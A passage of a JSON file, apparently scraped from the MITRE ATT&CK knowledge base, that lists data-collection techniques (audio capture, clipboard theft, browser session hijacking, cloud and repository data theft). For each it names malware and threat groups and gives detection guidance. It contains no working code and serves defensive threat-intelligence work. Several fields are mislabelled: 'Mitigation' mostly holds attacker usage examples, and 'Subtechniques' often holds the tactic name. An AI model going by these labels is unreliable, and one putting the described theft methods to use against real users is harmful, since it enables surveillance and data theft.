        "description": "DOGCALL can capture microphone data from the victim's machine.[10]"
      },
      {
        "id": "S0152",
        "name": "EvilGrab",
        "description": "EvilGrab has the capability to capture audio from a victim machine.[11]"
      },
      {
        "id": "S0143",
        "name": "Flame",
        "description": "Flame can record audio using any existing hardware recording devices.[12][13]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has a remote microphone monitoring capability.[14][15]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can record sound using input audio devices.[16][17]"
      },
      {
        "id": "S0163",
        "name": "Janicab",
        "description": "Janicab captured audio and sent it out to a C2 server.[18][19]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can capture microphone recordings.[20]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete captures audio from the computer’s microphone.[21][22][23]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa has the ability to record audio.[24]"
      },
      {
        "id": "S0282",
        "name": "MacSpy",
        "description": "MacSpy can record the sounds from microphones on a computer.[25]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia can perform microphone recording.[26]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore can capture audio feeds from the system.[27][28]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can load a module to leverage the LAME encoder and mciSendStringW to control and capture audio.[29]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Get-MicrophoneAudio Exfiltration module can record system microphone audio.[30][31]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can record sound with the microphone.[32]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos can capture data from the system’s microphone.[33]"
      },
      {
        "id": "S0379",
        "name": "Revenge RAT",
        "description": "Revenge RAT has a plugin for microphone interception.[34][35]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT has an audio capture and eavesdropping module.[36]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[37]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to capture VoiceIP application audio on an infected host.[38]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN can perform audio capture.[39]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that can leverage a computer’s peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls associated with leveraging a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Automated Collection",
    "Code": "T1119",
    "Description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has automatically collected data from USB drives, keystrokes, and screen images before exfiltration.[1]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 used a batch script to perform a series of discovery techniques and saves it to a text file.[2]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has automatically collected data about the compromised system.[4]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS monitors USB devices and copies files with certain extensions to a predefined directory.[5]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot recursively generates a list of files within a directory and sends them back to the control server.[6]"
      },
      {
        "id": "S1043",
        "name": "ccf32",
        "description": "ccf32 can be used to automatically collect files from a compromised host.[7]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used custom DLLs for continuous retrieval of data from memory.[8]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.[9]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.[10]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch can automatically monitor removable drives in a loop and copy interesting files.[11]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can automatically gather the username, domain name, machine name, and other information from a compromised system.[12]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[13]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.[14][15]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information.[12]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can monitor files for changes and automatically collect them.[7]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents.[16]"
      },
      {
        "id": "S0597",
        "name": "GoldFinder",
        "description": "GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.[17]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "A Helminth VBScript receives a batch script to execute a set of commands in a command prompt.[18]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.[19][20]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has performed frequent and scheduled data collection from victim networks.[21]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron can be configured to automatically collect files under a specified directory.[22]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used the Csvde tool to collect Active Directory files and data.[23]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.[24]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing.[25]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (.xls, .xlsx, .csv, .odt, .doc, .docx, .ppt, .pptx, .pdf, .mdb, .accdb, .accde, *.txt).[26]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda used custom batch scripts to collect files automatically from a targeted system.[27]"
      },
      {
        "id": "S0699",
        "name": "Mythic",
        "description": "Mythic supports scripting of file downloads from agents.[28]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can automatically archive collected data.[29]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used automated collection.[30]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used a script to collect information about the infected system.[31]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can automatically scan for and collect files with specific extensions.[32]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.[33]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.[5]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT used file system monitoring to track modification and enable automatic exfiltration.[34]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains a module for recursively parsing through files and directories to gather valid credit card numbers.[35]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc automatically collects data about the victim and sends it to the control server.[36]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.[37]"
      },
      {
        "id": "S0684",
        "name": "ROADTools",
        "description": "ROADTools automatically gathers data from Azure AD environments using the Azure Graph API.[38]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "Depending on the Linux distribution, RotaJakiro executes a set of commands to collect device information and sends the collected information to the C2 server.[39]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.[40]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.[41][42]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.[43]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to automatically collect system and network configuration information.[44]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.[45]"
      },
      {
        "id": "S0098",
        "name": "T9000",
        "description": "T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, .ppt, .xls, .docx, .pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.[46]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to index and compress files into a send queue for exfiltration.[47]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[48]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has collected information automatically using the adversary's USBferry attack.[49]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration.[50]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can download a module to search for and build a report of harvested credential data.[51]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .[52]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail can identify and add files that possess specific file extensions to an array for archiving.[53]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.[54][55]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to collect internal data."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected files (e.g., .pdf, .docx, .jpg, etc.) viewed for collecting internal data."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Browser Session Hijacking",
    "Code": "T1185",
    "Description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.[1]A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.[2][3] Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.[4]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla has the ability to use form-grabbing to extract data from web data forms.[5]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has captured credentials when a user performs login through a SSL session.[6][7]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.[8]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.[4][9]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.[10]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[11][12][13]"
      },
      {
        "id": "S0483",
        "name": "IcedID",
        "description": "IcedID has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  IcedID can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.[14][15]"
      },
      {
        "id": "S0530",
        "name": "Melcoz",
        "description": "Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.[11]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use advanced web injects to steal web banking credentials.[16][17]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.[18][19][20][21]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).[22]"
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Access",
        "detects": "This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. Monitor for Process Injection against browser applications."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Modification",
        "detects": "This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. Monitor for Process Injection against browser applications."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Clipboard Data",
    "Code": "T1115",
    "Description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard.[1][2][3] Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., Transmitted Data Manipulation).[4]macOS and Linux also have commands, such as pbpaste, to grab clipboard contents.[5]",
    "Mitigation": [
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can steal data from the victim’s clipboard.[6][7][8][9]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 used a Trojan called KEYLIME to collect data from the clipboard.[10]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used tools capable of stealing contents of the clipboard.[11]"
      },
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. [12]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.[13]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to steal data from the clipboard.[14]"
      },
      {
        "id": "S0261",
        "name": "Catchamas",
        "description": "Catchamas steals data stored in the clipboard.[15]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to capture and store clipboard data.[16][17]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds.[18]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can steal data from the clipboard.[19]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can download a clipboard information stealer module.[20]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can harvest clipboard data on both Windows and macOS systems.[21]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has a function to use the OpenClipboard wrapper.[22]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy can collect clipboard data.[23]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can capture clipboard data from a compromised host.[24]"
      },
      {
        "id": "S0170",
        "name": "Helminth",
        "description": "The executable version of Helminth has a module to log clipboard contents.[25]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image.[26]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can capture clipboard data.[27]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can retrieve the current content of the user clipboard.[28]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI had a feature to steal data from the clipboard.[29]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete hijacks the clipboard data by creating an overlapped window that listens to keyboard events.[30][31]"
      },
      {
        "id": "S0282",
        "name": "MacSpy",
        "description": "MacSpy can steal clipboard contents.[32]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can capture clipboard content.[33]"
      },
      {
        "id": "S0530",
        "name": "Melcoz",
        "description": "Melcoz can monitor content saved to the clipboard.[34]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.[35][36]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors collected clipboard data in plaintext.[37]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos steals and modifies data from the clipboard.[38]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi collects text from the clipboard.[39]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can extract clipboard data from a compromised host.[40]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM collects data from the clipboard.[41][42]"
      },
      {
        "id": "S0253",
        "name": "RunningRAT",
        "description": "RunningRAT contains code to open and copy data from the clipboard.[43]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to steal data from the clipboard of an infected host.[44]"
      },
      {
        "id": "S0004",
        "name": "TinyZBot",
        "description": "TinyZBot contains functionality to collect information from the clipboard.[45]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN collects data stored in the clipboard.[46]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda can hook GetClipboardData function to watch for clipboard pastes to collect.[47]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments to collect data stored in the clipboard from users copying information within or between applications."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor API calls that could collect data stored in the clipboard from users copying information within or between applications."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Data from Cloud Storage",
    "Code": "T1530",
    "Description": "Adversaries may access data from cloud storage.Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.[1][2][3] There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.[4][5][6][7]Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can collect files from a user’s OneDrive.[8]"
      },
      {
        "id": "C0027",
        "name": "C0027",
        "description": "During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[9]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has obtained files from the victim's cloud storage instances.[10]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can enumerate and download files stored in AWS storage services, such as S3 buckets.[11]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Access",
        "detects": "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set and are allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Data from Configuration Repository",
    "Code": "T1602",
    "Description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.[1][2]",
    "Mitigation": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": "Configure SNMPv3 to use the highest level of security (authPriv) available.[2]"
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": "Apply extended ACLs to block unauthorized protocols outside the trusted network.[2]"
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources.[1]"
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": "Segregate SNMP traffic on a separate management network.[2]"
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": "Allowlist MIB objects and implement SNMP views.[3]"
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": "Keep system images and software updated and migrate to SNMPv3.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that are sent or received by untrusted hosts or uncommon data flows. Consider analyzing packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access configuration content)"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access configuration content)"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1602.001",
        "name": "SNMP (MIB Dump)"
      },
      {
        "id": "T1602.002",
        "name": "Network Device Configuration Dump"
      }
    ],
    "Tactic": "\nCollection"
  },
  {
    "Title": "Data from Information Repositories",
    "Code": "T1213",
    "Description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentialsWork / project schedulesSource code snippetsLinks to network shares and other internal resourcesInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has collected files from various information repositories.[1]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has collected schemas and user accounts from systems running SQL Server.[2]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information.[3]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.[4]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell has the ability to list and extract data from SQL databases.[5]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[6]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has used a custom .NET tool to collect documents from an organization's internal central database.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage information repositories to mine valuable information. Information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior within Microsoft's SharePoint can be configured to report access to certain pages and documents. [8] Sharepoint audit logging can also be configured to report when a user shares a resource. [9]The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. [10] Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1213.001",
        "name": "Confluence"
      },
      {
        "id": "T1213.002",
        "name": "Sharepoint"
      },
      {
        "id": "T1213.003",
        "name": "Code Repositories"
      }
    ],
    "Tactic": "\nCollection"
  },
  {
    "Title": "Data from Local System",
    "Code": "T1005",
    "Description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information.[1] Adversaries may also use Automated Collection on the local system.",
    "Mitigation": [
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT can collect local data from an infected machine.[2]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey can collect information from a compromised host.[3]"
      },
      {
        "id": "G0138",
        "name": "Andariel",
        "description": "Andariel has collected large numbers of files from compromised network systems for later extraction.[4]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can collect data on a compromised host.[5][6]"
      },
      {
        "id": "G0006",
        "name": "APT1",
        "description": "APT1 has collected files from a local victim.[7]"
      },
      {
        "id": "G0007",
        "name": "APT28",
